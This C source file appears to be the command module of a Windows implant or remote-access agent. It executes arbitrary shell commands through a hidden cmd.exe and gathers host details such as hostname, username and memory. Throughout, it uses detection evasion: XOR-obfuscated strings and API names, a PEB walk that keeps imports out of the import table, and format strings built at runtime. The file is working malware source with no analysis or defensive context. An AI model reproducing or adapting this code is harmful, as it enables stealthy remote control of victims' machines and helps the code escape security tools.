#include "commands.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* GetNativeSystemInfo — removes from IAT */
typedef void (WINAPI *_GNS_t)(LPSYSTEM_INFO);
static void _gns(LPSYSTEM_INFO si) {
    static _GNS_t fn = NULL;
    if (!fn) {
        char fs[22], ks[14]; volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GetNativeSystemInfo); i++) fs[i] = (char)(EVS_fn_GetNativeSystemInfo[i] ^ xk);
        fs[sizeof(EVS_fn_GetNativeSystemInfo)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++) ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks); SecureZeroMemory(ks, sizeof(ks));
        if (m) fn = (_GNS_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    if (fn) fn(si);
    else GetSystemInfo(si);
}

/* GetComputerNameA — removes from IAT */
typedef BOOL (WINAPI *_SGCN_t)(LPSTR, LPDWORD);
static BOOL _sgcna(LPSTR buf, LPDWORD sz) {
    static _SGCN_t fn = NULL;
    if (!fn) {
        char fs[20], ks[14]; volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GetComputerNameA); i++) fs[i] = (char)(EVS_fn_GetComputerNameA[i] ^ xk);
        fs[sizeof(EVS_fn_GetComputerNameA)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++) ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks); SecureZeroMemory(ks, sizeof(ks));
        if (m) fn = (_SGCN_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(buf, sz) : FALSE;
}

/* GlobalMemoryStatusEx — removes from IAT */
typedef BOOL (WINAPI *_GMSE_t)(LPMEMORYSTATUSEX);
static BOOL _gmse(LPMEMORYSTATUSEX p) {
    static _GMSE_t fn = NULL;
    if (!fn) {
        char fs[22], ks[14]; volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GlobalMemoryStatusEx); i++) fs[i] = (char)(EVS_fn_GlobalMemoryStatusEx[i] ^ xk);
        fs[sizeof(EVS_fn_GlobalMemoryStatusEx)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++) ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks); SecureZeroMemory(ks, sizeof(ks));
        if (m) fn = (_GMSE_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(p) : FALSE;
}

/* run a shell command via cmd.exe and capture stdout+stderr */
int cmd_shell(const char *cmdline, char *output_buf, size_t output_size)
{
    if (!cmdline || !output_buf || output_size == 0) return -1;
    output_buf[0] = '\0';

    /* create pipe for child output */
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE pipe_rd = NULL, pipe_wr = NULL;
    if (!CreatePipe(&pipe_rd, &pipe_wr, &sa, 0)) return -1;

    /* prevent read end from being inherited */
    if (!SetHandleInformation(pipe_rd, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(pipe_rd); CloseHandle(pipe_wr);
        return -1;
    }

    /* NUL as stdin so child doesn't block waiting for input */
    HANDLE hNull = CreateFileA("NUL", GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               &sa, OPEN_EXISTING, 0, NULL);

    /* XOR-obfuscated "cmd.exe" to avoid plaintext in .rdata */
    static const unsigned char k_cx[] = {0xdd,0xd3,0xda,0x90,0xdb,0xc6,0xdb}; /* XOR 0xbe */
    char cx[8] = {0};
    { volatile unsigned char _x = 0xbe;
      for (int _i = 0; _i < (int)sizeof(k_cx); _i++) cx[_i] = k_cx[_i] ^ _x; }

    volatile char redir[6]; /* " 2>&1" */
    redir[0]=0x20; redir[1]=0x32; redir[2]=0x3e; redir[3]=0x26; redir[4]=0x31; redir[5]=0x00;

    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "%s /C %s%s", cx, cmdline, (const char *)redir);
    memset(cx, 0, sizeof(cx));

    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = pipe_wr;
    si.hStdError   = pipe_wr;
    si.hStdInput   = (hNull != INVALID_HANDLE_VALUE) ? hNull : NULL;

    BOOL ok = CreateProcessA(NULL, full_cmd, NULL, NULL,
                             TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);
    if (hNull != INVALID_HANDLE_VALUE) CloseHandle(hNull);
    CloseHandle(pipe_wr);

    if (!ok) {
        CloseHandle(pipe_rd);
        DWORD _err = GetLastError();
        /* "[e:%lu]\n" built at runtime */
        volatile char efmt[10];
        efmt[0]=0x5b; efmt[1]=0x65; efmt[2]=0x3a; efmt[3]=0x25;
        efmt[4]=0x6c; efmt[5]=0x75; efmt[6]=0x5d; efmt[7]=0x0a; efmt[8]=0x00;
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-nonliteral"
        snprintf(output_buf, output_size, (const char *)efmt, _err);
#pragma GCC diagnostic pop
        return -1;
    }

    /* read output with 30s timeout */
    DWORD  timeout_ms = 30000;
    DWORD  start      = GetTickCount();
    size_t offset     = 0;
    DWORD  bytes_read = 0;

    while (offset < output_size - 1) {
        if (GetTickCount() - start > timeout_ms) break;

        DWORD avail = 0;
        if (!PeekNamedPipe(pipe_rd, NULL, 0, NULL, &avail, NULL)) break;

        if (avail == 0) {
            if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break;
            Sleep(50);
            continue;
        }

        DWORD to_read = avail;
        if (to_read > (DWORD)(output_size - 1 - offset))
            to_read = (DWORD)(output_size - 1 - offset);

        if (!ReadFile(pipe_rd, output_buf + offset, to_read, &bytes_read, NULL)) break;
        offset += bytes_read;
    }

    DWORD extra = 0;
    while (offset < output_size - 1 &&
           ReadFile(pipe_rd, output_buf + offset, 1, &extra, NULL) && extra > 0)
        offset += extra;

    output_buf[offset] = '\0';

    if (offset == 0)
        strncpy(output_buf, "(no output)", output_size - 1);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(pipe_rd);
    return 0;
}

/* collect basic system info */

int cmd_sysinfo(char *output_buf, size_t output_size)
{
    char hostname[256] = {0};
    char username[128] = {0};
    DWORD sz;

    sz = sizeof(hostname);
    _sgcna(hostname, &sz);
    sz = sizeof(username);
    GetUserNameA(username, &sz);

    SYSTEM_INFO si;
    _gns(&si);

    MEMORYSTATUSEX mem;
    memset(&mem, 0, sizeof(mem));
    mem.dwLength = sizeof(mem);
    _gmse(&mem);

    snprintf(output_buf, output_size,
             "Hostname  : %s\n"
             "Username  : %s\n"
             "OS Arch   : %s\n"
             "Processors: %lu\n"
             "RAM Total : %llu MB\n"
             "RAM Free  : %llu MB\n",
             hostname,
             username,
             si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
             si.dwNumberOfProcessors,
             mem.ullTotalPhys / (1024*1024),
             mem.ullAvailPhys / (1024*1024));
    return 0;
}
